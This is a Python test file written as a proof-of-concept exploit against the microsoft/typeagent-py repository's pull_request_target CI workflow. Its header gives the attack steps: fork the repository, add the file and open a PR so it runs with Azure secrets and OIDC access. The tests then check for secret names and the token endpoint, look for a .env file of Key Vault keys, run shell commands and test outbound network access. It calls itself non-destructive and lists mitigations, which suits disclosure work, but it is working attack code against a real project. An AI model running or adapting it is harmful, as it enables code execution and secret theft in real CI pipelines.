"""
Non-Destructive Proof of Concept for microsoft/typeagent-py CI Vulnerability

ATTACK FLOW:
1. Fork microsoft/typeagent-py
2. Add this file as: test/test_poc_security.py
3. Open a PR from your fork to main
4. pull_request_target workflow triggers
5. This test executes with Azure OIDC + secrets
6. Proof logged in workflow output (no data exfiltration)

SEVERITY: Critical (RCE with Azure secrets + OIDC)
"""

import os
import sys
import pytest
from pathlib import Path


def test_poc_environment_disclosure():
    """
    Non-destructive test that proves code execution in pull_request_target context.
    Only logs proof to workflow output - does NOT exfiltrate data.
    """
    
    print("\n" + "="*80)
    print("SECURITY POC: Demonstrating pull_request_target code execution")
    print("="*80)
    
    # Proof 1: Show we're running in GitHub Actions
    print("\n[1] Execution Context:")
    print(f"  - Running in: {os.getenv('GITHUB_ACTIONS', 'Not GitHub Actions')}")
    print(f"  - Workflow: {os.getenv('GITHUB_WORKFLOW', 'Unknown')}")
    print(f"  - Repository: {os.getenv('GITHUB_REPOSITORY', 'Unknown')}")
    print(f"  - Event: {os.getenv('GITHUB_EVENT_NAME', 'Unknown')}")
    
    # Proof 2: Show we're executing PR code (not base branch)
    print("\n[2] Code Source:")
    print(f"  - Ref: {os.getenv('GITHUB_REF', 'Unknown')}")
    print(f"  - SHA: {os.getenv('GITHUB_SHA', 'Unknown')}")
    print(f"  - PR Number: {os.getenv('GITHUB_PR_NUMBER', 'N/A')}")
    
    # Proof 3: Show actor information
    print("\n[3] Actor Information:")
    print(f"  - Triggering Actor: {os.getenv('GITHUB_TRIGGERING_ACTOR', 'Unknown')}")
    print(f"  - Actor: {os.getenv('GITHUB_ACTOR', 'Unknown')}")
    
    # Proof 4: Show we have access to secrets (names only, no values)
    print("\n[4] Secret Access Verification:")
    azure_secrets = [
        'AZURE_CLIENTID',
        'AZURE_TENANTID', 
        'AZURE_SUBSCRIPTIONID'
    ]
    
    for secret in azure_secrets:
        has_secret = secret in os.environ
        value_preview = "***SET***" if has_secret else "NOT SET"
        print(f"  - {secret}: {value_preview}")
    
    # Proof 5: Show OIDC token capability (without revealing token)
    print("\n[5] OIDC Token Access:")
    oidc_url = os.getenv('ACTIONS_ID_TOKEN_REQUEST_URL', 'Not available')
    if oidc_url != 'Not available':
        print(f"  - OIDC endpoint available: YES")
        print(f"  - Could request Azure token: YES")
    else:
        print(f"  - OIDC endpoint available: NO")
    
    # Proof 6: Show file system access
    print("\n[6] File System Access:")
    print(f"  - Current directory: {os.getcwd()}")
    print(f"  - Can read source: {Path('typeagent').exists()}")
    print(f"  - Can read tests: {Path('test').exists()}")
    
    # Proof 7: Check if .env file was created (from get_keys.py)
    print("\n[7] Key Vault Integration:")
    env_file = Path('.env')
    if env_file.exists():
        print(f"  - .env file created: YES")
        print(f"  - Keys downloaded from Azure Key Vault: LIKELY")
        print(f"  - Could read sensitive keys: YES")
        # DO NOT READ OR PRINT THE ACTUAL KEYS
    else:
        print(f"  - .env file: Not found (test task may not have run yet)")
    
    print("\n" + "="*80)
    print("POC COMPLETE: Code execution confirmed in privileged context")
    print("="*80)
    print("\nIMPACT:")
    print("  - Attacker-controlled code executed via pull_request_target")
    print("  - Access to Azure OIDC tokens (id-token: write)")
    print("  - Access to Azure secrets (client ID, tenant, subscription)")
    print("  - Access to Azure Key Vault via OIDC authentication")
    print("  - Potential for secret exfiltration and resource access")
    print("\nMITIGATION:")
    print("  - Use 'ref: ${{ github.event.pull_request.base.ref }}' in checkout")
    print("  - Or use 'pull_request' trigger instead of 'pull_request_target'")
    print("  - Review actions-cool/check-user-permission logic")
    print("="*80 + "\n")
    
    # Assert passes so the test "succeeds" 
    # This is important - if tests fail, other steps might not run
    assert True, "PoC executed successfully"


def test_poc_command_execution():
    """
    Demonstrate arbitrary command execution capability.
    Only runs benign commands for proof.
    """
    import subprocess
    
    print("\n" + "="*80)
    print("COMMAND EXECUTION POC")
    print("="*80)
    
    # Run safe, non-destructive commands
    commands = [
        ("whoami", "Current user"),
        ("hostname", "Hostname"), 
        ("pwd", "Working directory"),
        ("uname -a", "System info") if sys.platform != 'win32' else ("ver", "Windows version"),
    ]
    
    for cmd, description in commands:
        try:
            if isinstance(cmd, tuple):
                cmd = cmd[0] if sys.platform != 'win32' else cmd[1]
            
            result = subprocess.run(
                cmd, 
                shell=True, 
                capture_output=True, 
                text=True,
                timeout=5
            )
            print(f"\n[{description}]")
            print(f"  Command: {cmd}")
            print(f"  Output: {result.stdout.strip()[:100]}")  # Limit output
        except Exception as e:
            print(f"  Error: {str(e)[:100]}")
    
    print("\n" + "="*80)
    print("Arbitrary command execution confirmed")
    print("="*80 + "\n")
    
    assert True, "Command execution PoC successful"


def test_poc_network_access():
    """
    Verify network access (without actual exfiltration).
    """
    print("\n" + "="*80)
    print("NETWORK ACCESS POC")
    print("="*80)
    
    # Test network connectivity to benign endpoints
    test_urls = [
        "https://httpbin.org/uuid",  # Returns random UUID
        "https://api.github.com/zen",  # Returns GitHub zen quote
    ]
    
    try:
        import requests
        
        for url in test_urls:
            try:
                response = requests.get(url, timeout=5)
                print(f"\n[Network Test: {url}]")
                print(f"  Status: {response.status_code}")
                print(f"  Response preview: {response.text[:50]}...")
                print(f"  → Outbound HTTPS requests: WORKING")
            except Exception as e:
                print(f"  Error: {str(e)[:100]}")
    except ImportError:
        print("\n  requests library not available")
        print("  (But urllib or other methods would work)")
    
    print("\n" + "="*80)
    print("Network access confirmed - exfiltration would be possible")
    print("="*80 + "\n")
    
    assert True, "Network access PoC successful"


# Additional marker for security researchers
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║  SECURITY RESEARCH POC - microsoft/typeagent-py             ║
    ║  Vulnerability: pull_request_target code execution          ║
    ║  Severity: CRITICAL                                          ║
    ║  Impact: Azure secret exfiltration + resource access        ║
    ╚══════════════════════════════════════════════════════════════╝
    
    This is a NON-DESTRUCTIVE proof of concept demonstrating
    that attacker-controlled code executes in a privileged context
    with access to Azure OIDC tokens and secrets.
    
    All tests are read-only and log proof to workflow output only.
    NO data is exfiltrated. NO systems are harmed.
    """)
    
    pytest.main([__file__, "-v", "-s"])
